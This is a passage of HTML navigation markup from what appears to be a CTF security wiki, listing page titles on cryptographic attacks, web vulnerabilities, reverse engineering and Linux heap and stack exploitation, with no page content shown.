    <a href="../../../../crypto/asymmetric/rsa/rsa_e_attack-zh/" class="md-nav__link">
      Public Key Index Related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_d_attack-zh/" class="md-nav__link">
      Private Key d Related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_coppersmith_attack-zh/" class="md-nav__link">
      Coppersmith Related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher-zh/" class="md-nav__link">
      Chosen Plain Cipher Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_side_channel-zh/" class="md-nav__link">
      Side Channel Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_pkcs_attack-zh/" class="md-nav__link">
      Bleichenbacher Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_complex-zh/" class="md-nav__link">
      Challenge Examples
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/knapsack/knapsack-zh/" class="md-nav__link">
      Knapsack Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-6-4" type="checkbox" id="nav-3-6-4">
    
    <label class="md-nav__link" for="nav-3-6-4">
      Discrete Log Correlation
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Discrete Log Correlation" data-md-level="3">
      <label class="md-nav__title" for="nav-3-6-4">
        <span class="md-nav__icon md-icon"></span>
        Discrete Log Correlation
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/discrete-log/discrete-log-zh/" class="md-nav__link">
      Discrete Logarithm
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/discrete-log/elgamal-zh/" class="md-nav__link">
      Elgamal
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/discrete-log/ecc-zh/" class="md-nav__link">
      ECC
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-6-5" type="checkbox" id="nav-3-6-5">
    
    <label class="md-nav__link" for="nav-3-6-5">
      Lattice-based Cryptography
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Lattice-based Cryptography" data-md-level="3">
      <label class="md-nav__title" for="nav-3-6-5">
        <span class="md-nav__icon md-icon"></span>
        Lattice-based Cryptography
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/overview-zh/" class="md-nav__link">
      Lattice Overview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/introduction-zh/" class="md-nav__link">
      Introduction to Lattices
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/lattice-reduction-zh/" class="md-nav__link">
      Lattice-based Algorithm
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/cvp-zh/" class="md-nav__link">
      CVP
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-7" type="checkbox" id="nav-3-7">
    
    <label class="md-nav__link" for="nav-3-7">
      Hash Function
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Hash Function" data-md-level="2">
      <label class="md-nav__title" for="nav-3-7">
        <span class="md-nav__icon md-icon"></span>
        Hash Function
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/introduction-zh/" class="md-nav__link">
      Introduction to the Hash Function
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/md5-zh/" class="md-nav__link">
      MD5
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/sha1-zh/" class="md-nav__link">
      SHA1
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/fnv-zh/" class="md-nav__link">
      FNV
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/attack-zh/" class="md-nav__link">
      Hash Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/complex-zh/" class="md-nav__link">
      Challenge Examples
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-8" type="checkbox" id="nav-3-8">
    
    <label class="md-nav__link" for="nav-3-8">
      Digital Signature
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Digital Signature" data-md-level="2">
      <label class="md-nav__title" for="nav-3-8">
        <span class="md-nav__icon md-icon"></span>
        Digital Signature
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/introduction-zh/" class="md-nav__link">
      Introduction to Digital Signatures
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/rsa-zh/" class="md-nav__link">
      RSA Digital Signature
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/elgamal-zh/" class="md-nav__link">
      ElGamal Digital Signature
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/dsa-zh/" class="md-nav__link">
      DSA Digital Signature
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-9" type="checkbox" id="nav-3-9">
    
    <label class="md-nav__link" for="nav-3-9">
      Summary of Attack Techniques
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Summary of Attack Techniques" data-md-level="2">
      <label class="md-nav__title" for="nav-3-9">
        <span class="md-nav__icon md-icon"></span>
        Summary of Attack Techniques
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/attack-summary/attack-mode-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/attack-summary/meet-in-the-middle-zh/" class="md-nav__link">
      Intermediate Encounter Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/attack-summary/bit-attack-zh/" class="md-nav__link">
      Bit attack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/certificate/introduction-zh/" class="md-nav__link">
      Certificate Format
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
    
    <label class="md-nav__link" for="nav-4">
      Web
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Web" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        <span class="md-nav__icon md-icon"></span>
        Web
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/introduction-zh/" class="md-nav__link">
      Introduction to Web Applications
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/sqli-zh/" class="md-nav__link">
      SQL Injection
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/xss-zh/" class="md-nav__link">
      XSS Cross-site Scripting Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/csrf-zh/" class="md-nav__link">
      CSRF Cross-site Request Forgery
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/ssrf-zh/" class="md-nav__link">
      SSRF Server Request Forgery
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/php/php-zh/" class="md-nav__link">
      PHP Code Auditing
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
    
    <label class="md-nav__link" for="nav-5">
      Assembly
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Assembly" data-md-level="1">
      <label class="md-nav__title" for="nav-5">
        <span class="md-nav__icon md-icon"></span>
        Assembly
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../assembly/x86-x64/readme-zh/" class="md-nav__link">
      x86_x64
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../assembly/mips/readme-zh/" class="md-nav__link">
      mips
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../assembly/arm/readme-zh/" class="md-nav__link">
      arm
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
    
    <label class="md-nav__link" for="nav-6">
      Executable
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Executable" data-md-level="1">
      <label class="md-nav__title" for="nav-6">
        <span class="md-nav__icon md-icon"></span>
        Executable
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-6-1" type="checkbox" id="nav-6-1">
    
    <label class="md-nav__link" for="nav-6-1">
      ELF file
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="ELF file" data-md-level="2">
      <label class="md-nav__title" for="nav-6-1">
        <span class="md-nav__icon md-icon"></span>
        ELF file
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/elf-structure-zh/" class="md-nav__link">
      ELF File Basic Structure
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/program-loading-zh/" class="md-nav__link">
      Program Loading
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/program-linking-zh/" class="md-nav__link">
      Program Link
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/running-overview-zh/" class="md-nav__link">
      Program Execution Flow
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-6-2" type="checkbox" id="nav-6-2">
    
    <label class="md-nav__link" for="nav-6-2">
      PE file
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="PE file" data-md-level="2">
      <label class="md-nav__title" for="nav-6-2">
        <span class="md-nav__icon md-icon"></span>
        PE file
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/pe/pe-excutable-zh/" class="md-nav__link">
      PE File Basic Structure
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/pe/pe-import-table-zh/" class="md-nav__link">
      PE Import Table
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/pe/pe-export-table-zh/" class="md-nav__link">
      PE Export Table
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/pe/pe-relocation-table-zh/" class="md-nav__link">
      PE Relocation Table
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
    
    <label class="md-nav__link" for="nav-7">
      Reverse Engineering
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Reverse Engineering" data-md-level="1">
      <label class="md-nav__title" for="nav-7">
        <span class="md-nav__icon md-icon"></span>
        Reverse Engineering
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-1" type="checkbox" id="nav-7-1">
    
    <label class="md-nav__link" for="nav-7-1">
      Reverse Overview
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Reverse Overview" data-md-level="2">
      <label class="md-nav__title" for="nav-7-1">
        <span class="md-nav__icon md-icon"></span>
        Reverse Overview
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/introduction-zh/" class="md-nav__link">
      Software Reverse Engineering Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/Identify-Encode-Encryption/introduction-zh/" class="md-nav__link">
      Common Encryption Algorithms and Code Recognition
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/maze/maze-zh/" class="md-nav__link">
      Labyrinth Problem
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/vm/vm-zh/" class="md-nav__link">
      Virtual Machine Command Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/unicorn/introduction-zh/" class="md-nav__link">
      Unicorn Engine Introduction
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-2" type="checkbox" id="nav-7-2">
    
    <label class="md-nav__link" for="nav-7-2">
      Linux Reverse
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linux Reverse" data-md-level="2">
      <label class="md-nav__title" for="nav-7-2">
        <span class="md-nav__icon md-icon"></span>
        Linux Reverse
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-2-1" type="checkbox" id="nav-7-2-1">
    
    <label class="md-nav__link" for="nav-7-2-1">
      Linux Reverse Technology
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linux Reverse Technology" data-md-level="3">
      <label class="md-nav__title" for="nav-7-2-1">
        <span class="md-nav__icon md-icon"></span>
        Linux Reverse Technology
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/ld_preload-zh/" class="md-nav__link">
      LD_PRELOAD
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/false-disasm-zh/" class="md-nav__link">
      Incorrect Disassembly Fix
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/detect-bp-zh/" class="md-nav__link">
      Detecting Breakpoints Bypassing
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/detect-dbg-zh/" class="md-nav__link">
      Detecting Debugging Bypassing
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-3" type="checkbox" id="nav-7-3">
    
    <label class="md-nav__link" for="nav-7-3">
      Windows Reverse
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Windows Reverse" data-md-level="2">
      <label class="md-nav__title" for="nav-7-3">
        <span class="md-nav__icon md-icon"></span>
        Windows Reverse
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-3-1" type="checkbox" id="nav-7-3-1">
    
    <label class="md-nav__link" for="nav-7-3-1">
      Shelling Technology
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Shelling Technology" data-md-level="3">
      <label class="md-nav__title" for="nav-7-3-1">
        <span class="md-nav__icon md-icon"></span>
        Shelling Technology
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/packer-introduction-zh/" class="md-nav__link">
      Introduction to the Protective case
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/trace-zh/" class="md-nav__link">
      Single Step Tracking Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/esp-zh/" class="md-nav__link">
      ESP Law
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/direct-oep-zh/" class="md-nav__link">
      One Step to the OEP Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/memory-zh/" class="md-nav__link">
      Memory Mirroring Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/last-exception-zh/" class="md-nav__link">
      Last Exception Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/sfx-zh/" class="md-nav__link">
      SFX Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/fix-iat-zh/" class="md-nav__link">
      DUMP and IAT Reconstruction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/manually-fix-iat-zh/" class="md-nav__link">
      Manually Find the IAT and Rebuild It Using ImportREC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/unpack-dll-zh/" class="md-nav__link">
      DLL File Unpacking
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-3-2" type="checkbox" id="nav-7-3-2">
    
    <label class="md-nav__link" for="nav-7-3-2">
      Anti-debugging Technology
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Anti-debugging Technology" data-md-level="3">
      <label class="md-nav__title" for="nav-7-3-2">
        <span class="md-nav__icon md-icon"></span>
        Anti-debugging Technology
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/ntglobalflag-zh/" class="md-nav__link">
      NtGlobalFlag
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/heap-flags-zh/" class="md-nav__link">
      Heap Flags
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/the-heap-zh/" class="md-nav__link">
      The Heap
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/int-3-zh/" class="md-nav__link">
      Interrupt 3
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/isdebuggerpresent-zh/" class="md-nav__link">
      IsDebuggerPresent
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/checkremotedebuggerpresent-zh/" class="md-nav__link">
      CheckRemoteDebuggerPresent
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/ntqueryinformationprocess-zh/" class="md-nav__link">
      NtQueryInformationProcess
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/zwsetinformationthread-zh/" class="md-nav__link">
      ZwSetInformationThread
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/junk-code-zh/" class="md-nav__link">
      Flower command
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/example-zh/" class="md-nav__link">
      Anti-debug technical example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8" type="checkbox" id="nav-8" checked>
    
    <label class="md-nav__link" for="nav-8">
      Pwn
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Pwn" data-md-level="1">
      <label class="md-nav__title" for="nav-8">
        <span class="md-nav__icon md-icon"></span>
        Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-1" type="checkbox" id="nav-8-1">
    
    <label class="md-nav__link" for="nav-8-1">
      Pwn Overview
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Pwn Overview" data-md-level="2">
      <label class="md-nav__title" for="nav-8-1">
        <span class="md-nav__icon md-icon"></span>
        Pwn Overview
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../readme-zh/" class="md-nav__link">
      Readme zh
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2" type="checkbox" id="nav-8-2" checked>
    
    <label class="md-nav__link" for="nav-8-2">
      Linux Pwn
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linux Pwn" data-md-level="2">
      <label class="md-nav__title" for="nav-8-2">
        <span class="md-nav__icon md-icon"></span>
        Linux Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-1" type="checkbox" id="nav-8-2-1">
    
    <label class="md-nav__link" for="nav-8-2-1">
      Security Protection Mechanism
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Security Protection Mechanism" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-1">
        <span class="md-nav__icon md-icon"></span>
        Security Protection Mechanism
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../mitigation/canary-zh/" class="md-nav__link">
      Canary
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-2" type="checkbox" id="nav-8-2-2">
    
    <label class="md-nav__link" for="nav-8-2-2">
      Stack Overflow
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Stack Overflow" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-2">
        <span class="md-nav__icon md-icon"></span>
        Stack Overflow
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/stack-intro-zh/" class="md-nav__link">
      Stack Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/stackoverflow-basic-zh/" class="md-nav__link">
      Stack Overflow Principle
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/basic-rop-zh/" class="md-nav__link">
      Basic ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/medium-rop-zh/" class="md-nav__link">
      Intermediate ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/advanced-rop-zh/" class="md-nav__link">
      Advanced ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/fancy-rop-zh/" class="md-nav__link">
      ROP Tricks
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-3" type="checkbox" id="nav-8-2-3">
    
    <label class="md-nav__link" for="nav-8-2-3">
      Format String Vulnerability
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Format String Vulnerability" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-3">
        <span class="md-nav__icon md-icon"></span>
        Format String Vulnerability
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_intro-zh/" class="md-nav__link">
      Format String Vulnerability Principle
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_exploit-zh/" class="md-nav__link">
      Format String Exploit
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_example-zh/" class="md-nav__link">
      Format String Vulnerability Example
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_detect-zh/" class="md-nav__link">
      Format String Vulnerability Detection
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-4" type="checkbox" id="nav-8-2-4" checked>
    
    <label class="md-nav__link" for="nav-8-2-4">
      Glibc Heap Related
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Glibc Heap Related" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-4">
        <span class="md-nav__icon md-icon"></span>
        Glibc Heap Related
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../introduction-zh/" class="md-nav__link">
      Introduction to Heap
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../heap_overview-zh/" class="md-nav__link">
      Heap Overview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../heap_structure-zh/" class="md-nav__link">
      Heap Related Data Structure
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-4-4" type="checkbox" id="nav-8-2-4-4">
    
    <label class="md-nav__link" for="nav-8-2-4-4">
      In-depth Understanding of Ptmalloc2
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="In-depth Understanding of Ptmalloc2" data-md-level="4">
      <label class="md-nav__title" for="nav-8-2-4-4">
        <span class="md-nav__icon md-icon"></span>
        In-depth Understanding of Ptmalloc2
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/overview-zh/" class="md-nav__link">
      Implementation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/basic-zh/" class="md-nav__link">
      Basic Functions in the heap implementation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/heap-init-zh/" class="md-nav__link">
      Heap Initialization
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/malloc-zh/" class="md-nav__link">
      Allocate Heap Memory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/free-zh/" class="md-nav__link">
      Free Heap Memory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/tcache-zh/" class="md-nav__link">
      Tcache
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/malloc_state-zh/" class="md-nav__link">
      malloc_state
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/misc-zh/" class="md-nav__link">
      Other
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../heapoverflow_basic-zh/" class="md-nav__link">
      Heap Overflow
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../off_by_one-zh/" class="md-nav__link">
      Heap-based Off-By-One
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../chunk_extend_overlapping-zh/" class="md-nav__link">
      Chunk Extend/Overlapping
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../unlink-zh/" class="md-nav__link">
      Unlink
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
